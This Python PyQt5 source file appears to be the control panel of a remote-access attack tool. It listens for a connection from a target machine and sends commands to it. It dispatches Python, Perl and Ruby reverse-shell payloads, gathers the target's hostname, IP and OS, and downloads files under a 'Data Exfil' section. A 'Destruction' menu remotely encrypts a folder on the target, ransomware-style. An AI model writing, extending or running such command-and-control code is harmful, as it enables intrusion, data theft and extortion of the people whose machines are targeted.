import imports

import sys
from PyQt5 import QtWidgets, uic
from PyQt5.QtGui import QIcon
from PyQt5.QtWidgets import QAction, QLabel, QMessageBox, QPushButton, QInputDialog


import threading
import os
import time

from server import s_sock, s_action
#from client import c_sock

## importing other UI files
from shell_popup import Ui_shell_SEND
from listen_popup import Ui_listener_popup
from Encryptor import Ui_Form as Encryptor_Popup

### importing modules
from reverse_shells import target as rev_shell_target

qtcreator_file  = "gui.ui"
Ui_MainWindow, QtBaseClass = uic.loadUiType(qtcreator_file)


class MyApp(QtWidgets.QMainWindow, Ui_MainWindow):
    def __init__(self):
        QtWidgets.QMainWindow.__init__(self)
        Ui_MainWindow.__init__(self)
        self.setupUi(self)

        self.connected = False
        self.connected_list = []
        
        ## starting connections
        self.PID = os.getpid()
        
        ## connector
        #self.action_Target_Connect.clicked.connect(self.target_connect)

        ## do not need to defire actions as they are already in the ui file
        #self.action1 = QAction("action_Target_Connect", self)
        
## ========================================
## Buttons n stuff ========================
## ========================================

        ## Getting started
        self.GettingStarted_Readme.triggered.connect(self.getting_started)
        
        ## Main GUI
        self.action_Target_Listen.triggered.connect(self.listen_popup)
        self.action_Target_Info.triggered.connect(self.target_info)
        
        ## button for sending commands
        self.shell_input_enter.clicked.connect(self.run_command)
        self.shell_input_enter.setShortcut("Return")
        
        ## PopUp for shells:
        #self.action_Target_Python_binbash.triggered.connect(self.shell_py_binbash)
        self.action_Target_Python_binbash.triggered.connect(self.python_shell_popup)
        self.action_Target_Perl_binbash.triggered.connect(self.perl_shell_popup)
        self.action_Target_Ruby_NonInteractive.triggered.connect(self.ruby_shell_popup)
        
        ## Destruciton tab
        self.actionEncrypt_Files.triggered.connect(self.encrypt_popup)
        

## ========================================
## Init Values ===========================
## ========================================        
        ## sets connected to red on startup
        self.status_Connected.setStyleSheet("background-color: red")
        ## setting buttons to disabled
        self.not_connected()
        
    def not_connected(self):
            ## Disabling stuff that needs to be disabled at startup:
        #== top buttons
        self.action_Target_Info.setDisabled(True)
        self.menu_Target_SpawnShell.setDisabled(True)
        self.menu_Target_Destruction.setDisabled(True)
        #== CMD input
        self.shell_input.setDisabled(True)
        self.shell_input_enter.setDisabled(True)
        
        
    def client_connected(self):
        self.action_Target_Info.setDisabled(False)
        self.menu_Target_SpawnShell.setDisabled(False)
        self.menu_Target_Destruction.setDisabled(False)

            
         #== CMD input
        self.shell_input.setDisabled(False)
        self.shell_input_enter.setDisabled(False)
        
        self.ERROR('', 'clear', '')

## ========================================
## Getting started tab ====================
## ========================================
        
    def getting_started(self):
                
        with open('Modules/GUI_System/gui_about','r') as f:
            welcome_message = f.read()
            self.text_Program_Output.setText(welcome_message)

        
        
## ========================================
## Shell PopUps ===========================
## ========================================
    

## Python Shell
    def python_shell_popup(self):
        ## Inits for the popup gui
        self.window = QtWidgets.QMainWindow()
        self.shell_popup = Ui_shell_SEND()
        self.shell_popup.setupUi(self.window)
        self.window.show()
        
        ## popping the shell prompt & running
        self.shell_popup.popup_shell_SEND.clicked.connect(self.python_shell_run_thread)
    

    def python_shell_run_thread(self):
        thread = threading.Thread(target=self.python_shell_run)
        #thread = threading.Thread(target=self.listen_popup())
        thread.start()
    
    def python_shell_run(self):
        ip = self.shell_popup.popup_shell_IP.text()
        port = self.shell_popup.popup_shell_PORT.text()
        program = self.shell_popup.popup_shell_SHELL.text()
        
        ## Hiding window after send button
        self.window.hide()
        
        payload = rev_shell_target.pyshell(ip, port, program)
        
        self.text_Program_Output.setText(s_sock.send_msg(s_sock, payload))
        
## Perl Shell
    def perl_shell_popup(self):
        ## Inits for the popup gui
        self.window = QtWidgets.QMainWindow()
        self.shell_popup = Ui_shell_SEND()
        self.shell_popup.setupUi(self.window)
        self.window.show()
        
        ## popping the shell prompt & running
        self.shell_popup.popup_shell_SEND.clicked.connect(self.perl_shell_run_thread)
    

    def perl_shell_run_thread(self):
        thread = threading.Thread(target=self.perl_shell_run)
        thread.start()
    
    def perl_shell_run(self):
        ip = self.shell_popup.popup_shell_IP.text()
        port = self.shell_popup.popup_shell_PORT.text()
        program = self.shell_popup.popup_shell_SHELL.text()
        
        ## Hiding window after send button
        self.window.hide()
        
        payload = rev_shell_target.perlshell(ip, port, program)
        self.text_Program_Output.setText(s_sock.send_msg(s_sock, payload))

## Ruby Shell
    def ruby_shell_popup(self):
        ## Inits for the popup gui
        self.window = QtWidgets.QMainWindow()
        self.shell_popup = Ui_shell_SEND()
        self.shell_popup.setupUi(self.window)
        self.window.show()
        
        ## popping the shell prompt & running
        self.shell_popup.popup_shell_SEND.clicked.connect(self.ruby_shell_run_thread)
    

    def ruby_shell_run_thread(self):
        thread = threading.Thread(target=self.ruby_shell_run)
        thread.start()
    
    def ruby_shell_run(self):
        ip = self.shell_popup.popup_shell_IP.text()
        port = self.shell_popup.popup_shell_PORT.text()
        program = self.shell_popup.popup_shell_SHELL.text()
        
        ## Hiding window after send button
        self.window.hide()
        
        payload = rev_shell_target.rubyshell(ip, port, program)
        self.text_Program_Output.setText(s_sock.send_msg(s_sock, payload))


## LA Listen Shell
    def listen_popup(self):
        self.window = QtWidgets.QMainWindow()
        self.listen_popup = Ui_listener_popup()
        self.listen_popup.setupUi(self.window)
        self.window.show()
        
        self.listen_ip = self.listen_popup.popup_listen_ip.text()
        self.listen_port = self.listen_popup.popup_listen_port.text()
        
        #print(self.listen_ip, self.listen_port)
        
        self.listen_popup.popup_listen_LISTEN.clicked.connect(self.target_listen_thread)
        #self.window.hide()

## ========================================
## Destructoin PopUps =====================
## ========================================

    def encrypt_popup(self):
        ## Inits for the popup gui
        self.window = QtWidgets.QMainWindow()
        self.Encryptor_Popup = Encryptor_Popup()
        self.Encryptor_Popup.setupUi(self.window)
        self.window.show()
        
        self.Encryptor_Popup.encryptor_EncryptButton.clicked.connect(self.encrypt_thread)
        

    def encrypt_thread(self):
        thread = threading.Thread(target=self.encrypt)
        thread.start()
    
    def encrypt(self):
        self.window.hide()
        
        self.encrypt_folder = self.Encryptor_Popup.encryptor_Folder.text()
        self.encrypt_extension = self.Encryptor_Popup.encryptor_Extension.text()
        self.encrypt_password = self.Encryptor_Popup.encryptor_Password.text()
        
        #print("ENCRYPTING")
        #print(self.encrypt_folder + '\n' + self.encrypt_password)
        
        s_action.encryptor(self.encrypt_folder, self.encrypt_extension, self.encrypt_password)
            #print("Success")
            #self.text_Program_Output.setText(f"Successful Encryption of {self.encrypt_folder}")
        ## Run encryptor with those 2 above values


## ========================================
## Server Functions =======================
## ========================================
    
## Error handler
    def ERROR(self, error, severity, fix):
        
        
        if severity == "high":
            self.status_ERROR.setText(f"ERROR: {error}\nFIX: {fix}")
            self.status_ERROR.setStyleSheet("background-color: red; color:black")
            
        elif severity == "medium":
            self.status_ERROR.setText(f"ERROR: {error}\nFIX: {fix}")
            self.status_ERROR.setStyleSheet("background-color: yellow; color:black")
            
        elif severity == "low":
            self.status_ERROR.setText(f"ERROR: {error}\nFIX: {fix}")
            self.status_ERROR.setStyleSheet("background-color: blue")
            
        elif severity == "clear":
            self.status_ERROR.setText("")
            self.status_ERROR.setStyleSheet("background-color: none")


## Thread for listener
    def target_listen_thread(self):
        self.window.hide()
        thread = threading.Thread(target=self.target_listen)
        #thread = threading.Thread(target=self.listen_popup())

        thread.start()


## Start Listener
    def target_listen(self):
        ## This is essentially a block until a connection is established, that's why its in its own thread       
        ## clearning error messages
        self.ERROR('', 'clear', '')
        try:
            self.status_Connected.setStyleSheet("background-color: purple")
            self.status_Connected.setText("Connection: Listening")
            
            s_sock.start_server(
                s_sock, 
                self.listen_popup.popup_listen_ip.text(), 
                int(self.listen_popup.popup_listen_port.text())
                )
            
            ## 2nd time around this does not turn green for some reason
            self.status_Connected.setStyleSheet("background-color: green")
            self.status_Connected.setText("Connection: Connected")
            
            self.connected = True

    ## Listener Error handling
        except OSError as e:
            #print(f"[SYS ERROR: ADDRESS ALREADY IN USE]: \n{e}")
            self.connected = False
            
            # setting connected to red
            self.status_Connected.setStyleSheet("background-color: red")
            self.status_Connected.setText(f"Connection: Disconnected")

            fix = f"Kill the process listening on {self.listen_popup.popup_listen_ip.text()}:{self.listen_popup.popup_listen_port.text()}"
            
            self.ERROR(e, 'medium', fix)
            #self.text_Program_Output.setText()

        except ValueError as e:
            self.connected = False
            
            # setting connected to red
            self.status_Connected.setStyleSheet("background-color: red")
            self.status_Connected.setText(f"Connection: Disconnected")
            
            self.ERROR(e, 'medium', fix="You probably put letters in the IP/PORT... try numbers. No DNS listener names at the moment")

        except Exception as e:
            #print(f"SYS ERROR]: {e}")
            print(e)
            self.connected = False
            
            # setting connected to red
            self.status_Connected.setStyleSheet("background-color: red")
            self.status_Connected.setText(f"Connection: Disconnected")
            
            self.ERROR(e, 'medium', fix="Not sure... This is the fail-safe error catcher, try a google?")

        ##enabling buttons again on connection
        if self.connected:
            self.client_connected()
            
## ========================================
## Shell Functions ========================
## ========================================

## Run a command
    def run_command(self):
        try:
        ## download 
            if "get" in self.shell_input.text()[:3]:
                self.data_download_thread(self.shell_input.text())

        ## target info
            elif self.shell_input.text() == "info":
                self.target_info()
        
        ## send command to target
            else:
                #server.send_msg(self.shell_input.text())
                self.text_Program_Output.setText(s_sock.send_msg(s_sock, self.shell_input.text()))
                ## Setting text back to nothing after a command
                self.shell_input.setText("")
            
    ## Error handling 
        except BrokenPipeError as e:
            self.text_Program_Output.setText("")
            ## connected on info bar
            self.status_Connected.setStyleSheet("background-color: red")
            self.status_Connected.setText("Connection: Disconnected")
            self.shell_input.setText("")
            
            self.ERROR(e, 'high', fix="Client has disconnected, not sure why.")
            
            ## setting buttons to disabled
            self.not_connected()

            


## target info
    def target_info(self):
        try:
            self.status_data_HOSTNAME.setText(s_action.c_get_hostname())
            self.status_data_IPADDR.setText(s_action.c_pub_ip())
            self.status_data_OS.setText(s_action.c_os())
            
    ## error handling
        except Exception as e:
            self.ERROR(e, 'high', fix="Error getting data, not sure why")
        
        #self.browser_Target_Status.setText(client.host.info())

## ========================================
## Data Exfil =============================
## ========================================

## Data Upload - Not working/implemented
    def data_upload_thread(self):
        print("UPLOAD")
        pass

    def data_upload(self):
        pass

## Data Download

    def data_download_thread(self, msg):
        import filetransfer_server
        
        lst = []
        for i in msg.split():
            lst.append(i)
                                                                        ## ip   port    save location (not used)   Target File to download
        self.text_Program_Output.setText(s_sock.file_download(s_sock, f"0.0.0.0 5000 /home/kali/data_from_client {lst[1]}"))
        
        self.shell_input.setText("")

    #def data_download(self, msg):
        #download = threading.Thread(target=self.data_download_thread, args=(msg))
        #download.start()

    

if __name__ == "__main__":
    try:
        app = QtWidgets.QApplication(sys.argv)
        window = MyApp()
        
        ## Icon
        app_icon = QIcon("Modules/GUI_System/Images/icon.png")
        app.setWindowIcon(app_icon)
                
        window.show()
        sys.exit(app.exec_())
        

    except Exception as e:
        print(f"ERROR OCCURED: \n{e}")